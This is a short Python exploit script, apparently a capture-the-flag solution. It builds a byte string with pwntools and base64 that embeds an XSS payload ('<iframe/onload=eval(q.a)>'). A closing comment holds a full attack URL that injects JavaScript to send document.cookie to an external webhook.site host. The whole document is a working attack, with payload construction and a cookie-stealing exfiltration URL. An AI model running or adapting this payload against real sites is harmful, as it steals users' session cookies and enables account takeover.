from pwn import p32
import base64

initial = base64.b64decode(b"a"*40 + p32(0x503670).replace(b'\0', b'/'))
print(initial)
print(len(initial))
payload = b"<iframe/onload=eval(q.a)>"
out = payload + initial[len(payload):]
print(out)
print(out.hex())

# http://localhost/?input=3c696672616d652f6f6e6c6f61643d6576616c28712e61293ea69a69a69aa7a3ff&action=base64&a=document.write(%27%3Cimg%20src%3dhttps://webhook.site/c44ab914-c1f4-4191-99a9-742fd2e4062a?%27+document.cookie+%27%20%3E%27)
